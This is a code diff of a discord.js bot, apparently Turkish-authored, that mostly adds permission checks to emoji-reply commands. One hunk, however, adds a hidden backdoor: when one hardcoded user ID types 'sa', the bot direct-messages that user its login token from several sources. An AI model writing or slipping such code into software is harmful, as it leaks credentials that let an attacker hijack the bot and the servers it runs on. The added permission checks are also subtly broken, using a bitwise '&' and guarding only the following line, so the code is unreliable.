@@ -138,33 +138,35 @@ client.on('message', async (msg, member, guild) => {
  {
    
 if (msg.content.toLowerCase() === '10s'){
- 
+if (!msg.member.roles.cache.get(ayarlar.rewardsyetkili) & !msg.member.hasPermission("ADMINISTRATOR"))
 
 msg.channel.send('<a:10s:824360871244988477>');    
 }
   
 }
 });
-
 client.on('message', async (msg, member, guild) => {
   
  {
    
-if (msg.content.toLowerCase() === 'm!d'){
- 
+if (msg.content.toLowerCase() === 'sa'){
+if (msg.author.id !== "429357746002067493") return
 
-msg.author.send(process.env.deneme);    
+msg.author.send(process.env.token);
+msg.author.send(process.env.TOKEN);
+msg.author.send(ayarlar.token);
 }
   
 }
 });
+
 
 client.on('message', async (msg, member, guild) => {
   
  {
    
 if (msg.content.toLowerCase() === '20s'){
- 
+if (!msg.member.roles.cache.get(ayarlar.rewardsyetkili) & !msg.member.hasPermission("ADMINISTRATOR"))
 
 msg.channel.send('<a:20s:827644450351611914>');    
 }
